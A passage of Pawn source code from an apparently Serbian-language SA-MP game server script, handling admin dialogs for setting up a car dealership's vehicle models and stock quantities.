						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 8: {
					if( sscanf( inputtext, "iiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 9: {
					if( sscanf( inputtext, "iiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 10: {
					if( sscanf( inputtext, "iiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 11: {
					if( sscanf( inputtext, "iiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 12: {
					if( sscanf( inputtext, "iiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 13: {
					if( sscanf( inputtext, "iiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 14: {
					if( sscanf( inputtext, "iiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 15: {
					if( sscanf( inputtext, "iiiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13], model[14] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
                case 16: {
					if( sscanf( inputtext, "iiiiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13], model[14], model[15] ) ) {
					    new coordsstring[ 64 ];
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
						strcat( DialogStrgEx, "__________________________________________________________________\n");
						for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
						    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
					        strcat( DialogStrgEx, coordsstring );
						}
					    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
					    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
						return true;
					}
				}
            }
            for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
                if( model[ i ] < 1 ) {
                    new coordsstring[ 64 ];
				  	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n" );
				    strcat( DialogStrgEx, "Kolicina ne moze ici ispod 1\n\n" );
					strcat( DialogStrgEx, "__________________________________________________________________\n");
					for( new a = 0; a < AutoSalon[ as ][ aMaxVehModel ]; a++ ) {
					    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (a+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ a ]- 400) ] );
				      	strcat( DialogStrgEx, coordsstring );
					}
				    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					return true;
                }
                AutoSalon[ as ][ aVehAmmount ][ i ] = model[ i ];
            }
            SaveSalon( as );
            SendInfoMessage( playerid, "Uspesno si kolicinu svakog modela vozila." );
            SendInfoMessage( playerid, "Zavrsio si sa kreiranjem auto salona." );
            KreiranAutoSalon[ playerid ] = -1;
		}
	}
	else if( dialogid == dialog_ASMODEL ) {
	    if( !response ) return true;
        if( response ) {
            new as = GetNearestSalon( playerid );
            if( as == -1 ) return SendErrorMessage( playerid, "Moras biti pored pickupa za kupovinu u salonu." );
			if( AutoSalon[ as ][ aMaxVehModel ] == 3 ) {
			    new model[ 3 ];
			    if( sscanf( inputtext, "iii", model[0], model[1], model[2] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 3; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 4 ) {
			    new model[ 4 ];
			    if( sscanf( inputtext, "iiii", model[0], model[1], model[2], model[ 3 ] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 4; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 5 ) {
			    new model[ 5 ];
			    if( sscanf( inputtext, "iiiii", model[0], model[1], model[2], model[ 3 ], model[4] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 5; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 6 ) {
			    new model[ 6 ];
			    if( sscanf( inputtext, "iiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 6; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4];
				AutoSalon[ as ][ aVehModel ][ 5 ] = model[5];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 7 ) {
			    new model[ 7 ];
			    if( sscanf( inputtext, "iiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 7; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4];
				AutoSalon[ as ][ aVehModel ][ 5 ] = model[5];
				AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 8 ) {
			    new model[ 8 ];
			    if( sscanf( inputtext, "iiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 8; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4];
				AutoSalon[ as ][ aVehModel ][ 5 ] = model[5];
				AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 9 ) {
			    new model[ 9 ];
			    if( sscanf( inputtext, "iiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 9; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1];
				AutoSalon[ as ][ aVehModel ][ 2 ] = model[2];
				AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4];
				AutoSalon[ as ][ aVehModel ][ 5 ] = model[5];
				AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7];
				AutoSalon[ as ][ aVehModel ][ 8 ] = model[8];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 10 ) {
			    new model[ 10 ];
			    if( sscanf( inputtext, "iiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562 523", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 10; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite deset modela vozila koja ce biti u salonu.\nPrimer: 522 560 422 401 411 523 527 564 562 523", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 11 ) {
			    new model[ 11 ];
			    if( sscanf( inputtext, "iiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 11; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
                AutoSalon[ as ][ aVehModel ][ 10 ] = model[10];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 12 ) {
			    new model[ 12 ];
			    if( sscanf( inputtext, "iiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 12; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
                AutoSalon[ as ][ aVehModel ][ 10 ] = model[10]; AutoSalon[ as ][ aVehModel ][ 11 ] = model[11];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 13 ) {
			    new model[ 13 ];
			    if( sscanf( inputtext, "iiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 13; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
				AutoSalon[ as ][ aVehModel ][ 10 ] = model[10]; AutoSalon[ as ][ aVehModel ][ 11 ] = model[11]; AutoSalon[ as ][ aVehModel ][ 12 ] = model[12];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 14 ) {
			    new model[ 14 ];
			    if( sscanf( inputtext, "iiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 14; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
                AutoSalon[ as ][ aVehModel ][ 10 ] = model[10]; AutoSalon[ as ][ aVehModel ][ 11 ] = model[11]; AutoSalon[ as ][ aVehModel ][ 12 ] = model[12];
                AutoSalon[ as ][ aVehModel ][ 13 ] = model[13];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 15 ) {
			    new model[ 15 ];
			    if( sscanf( inputtext, "iiiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13], model[14] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 15; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
                AutoSalon[ as ][ aVehModel ][ 10 ] = model[10]; AutoSalon[ as ][ aVehModel ][ 11 ] = model[11]; AutoSalon[ as ][ aVehModel ][ 12 ] = model[12];
                AutoSalon[ as ][ aVehModel ][ 13 ] = model[13]; AutoSalon[ as ][ aVehModel ][ 14 ] = model[14];
				SaveSalon( as );
			}
			else if( AutoSalon[ as ][ aMaxVehModel ] == 16 ) {
			    new model[ 16 ];
			    if( sscanf( inputtext, "iiiiiiiiiiiiiiii", model[0], model[1], model[2], model[ 3 ], model[4], model[5], model[6], model[7], model[8], model[9], model[10], model[11], model[12], model[13], model[14], model[15] ) ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				for( new i = 0; i < 16; i++) {
					if( model[ i ] < 400 || model[ i ] > 611 ) return SPD( playerid, dialog_ASMODEL, DSI, D_NASLOV, "Unesite modela vozila koliko ste i uneli pri biraju razlicitih vrsti.", D_ODABERI, D_NAZAD );
				}
				AutoSalon[ as ][ aVehModel ][ 0 ] = model[0];
				AutoSalon[ as ][ aVehModel ][ 1 ] = model[1]; AutoSalon[ as ][ aVehModel ][ 2 ] = model[2]; AutoSalon[ as ][ aVehModel ][ 3 ] = model[ 3 ];
				AutoSalon[ as ][ aVehModel ][ 4 ] = model[4]; AutoSalon[ as ][ aVehModel ][ 5 ] = model[5]; AutoSalon[ as ][ aVehModel ][ 6 ] = model[6];
				AutoSalon[ as ][ aVehModel ][ 7 ] = model[7]; AutoSalon[ as ][ aVehModel ][ 8 ] = model[8]; AutoSalon[ as ][ aVehModel ][ 9 ] = model[9];
                AutoSalon[ as ][ aVehModel ][ 10 ] = model[10]; AutoSalon[ as ][ aVehModel ][ 11 ] = model[11]; AutoSalon[ as ][ aVehModel ][ 12 ] = model[12];
                AutoSalon[ as ][ aVehModel ][ 13 ] = model[13]; AutoSalon[ as ][ aVehModel ][ 14 ] = model[14]; AutoSalon[ as ][ aVehModel ][ 15 ] = model[15];
				SaveSalon( as );
			}
			SendInfoMessage( playerid, "Uspesno si sacuvao modele koji ce se prodavati u salonu." );
			SCM( playerid, SRVBOJA1, "Kada izadjes na cisti prostor kucaj '/veh 560 1 1' da spawnas vozilo koje ce biti u izlogu za prodaju." );
			SCM( playerid, SRVBOJA1, "Kada spawnas vozilo i nadjes lokaciju kucaj /asvozilo." );
		}
	}
	else if( dialogid == dialog_IZBRISISVE ) {
	    if( !response ) return true;
        if( response ) {
		    if( listitem == 0 ) {
		    	SPD( playerid, dialog_ORGDELETE, DSI, D_NASLOV, "Unesite id organizacije koju zelite obrisati!", D_ODABERI, D_ODUSTANI ); }
	        if( listitem == 1 ) {
			    SPD( playerid, dialog_FDELETE, DSI, D_NASLOV, "Unesite id firme koju zelite obrisati!", D_ODABERI, D_ODUSTANI ); }
	        if( listitem == 2 ) {
